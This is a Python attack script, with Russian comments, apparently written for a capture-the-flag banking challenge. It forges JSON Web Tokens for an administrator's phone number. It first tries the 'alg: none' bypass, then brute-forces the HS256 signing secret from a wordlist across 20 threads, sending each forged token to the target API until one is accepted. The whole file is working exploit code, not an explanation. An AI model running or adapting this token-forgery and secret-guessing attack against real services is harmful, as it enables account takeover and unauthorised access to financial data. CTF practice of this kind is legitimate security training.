import jwt
import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import threading

admin_phone = '+78005553535'
url = 'https://banking.2gisctf.ru/api/user'
wordlist_path = 'secrets.txt'
found = threading.Event()

# Загружаем словарь
with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
    secrets = [line.strip() for line in f if line.strip()]

print(f'[+] Загружено {len(secrets)} возможных секретов')

def try_secret(secret):
    if found.is_set():
        return

    try:
        payload = {
            'sub': admin_phone,
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(days=1),
            'type': 'access'
        }

        token = jwt.encode(payload, secret, algorithm='HS256')

        headers = {
            'Authorization': f'Bearer {token}'
        }

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            print('\n' + '='*40)
            print(f'[+] Найден секрет: {secret}')
            print(f'[+] Токен: {token}')
            print(f'[+] Ответ: {response.text}')
            print('='*40 + '\n')
            found.set()
    except Exception as e:
        pass

# Попытка с alg: none
def try_none_alg():
    try:
        payload = {
            'sub': admin_phone,
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(days=1),
            'type': 'access'
        }

        token = jwt.encode(payload, key=None, algorithm=None)

        headers = {
            'Authorization': f'Bearer {token}'
        }

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            print('\n' + '='*40)
            print('[+] Уязвимость: JWT с alg: none принят!')
            print(f'[+] Токен: {token}')
            print(f'[+] Ответ: {response.text}')
            print('='*40 + '\n')
            found.set()
    except Exception as e:
        print('[!] alg: none не сработал')

# Сначала пробуем alg: none
try_none_alg()

# Затем запускаем подбор
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(try_secret, secrets)